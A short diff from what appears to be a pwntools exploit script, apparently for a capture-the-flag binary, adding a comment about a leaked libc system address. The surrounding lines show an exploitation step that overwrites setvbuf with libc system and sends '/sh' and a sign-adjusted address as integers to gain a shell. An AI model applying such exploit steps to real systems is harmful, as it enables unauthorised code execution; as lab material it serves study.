@@ -65,6 +65,7 @@ p.sendline(str(u32(b"/sh\x00")).encode())
 debug("Setting setvBuf to System")
 debug("system Value LibC " + hex(libc.sym.system))
 # we need to send the libC system as an integer
+# but system libc value is 0xf7d4a8d0
 # however it is too big to fit to a signed positive integer (as %d is for signed integers)
 # so we need to make the sign negative
 libc.sym.system = libc.sym.system - 0x100000000
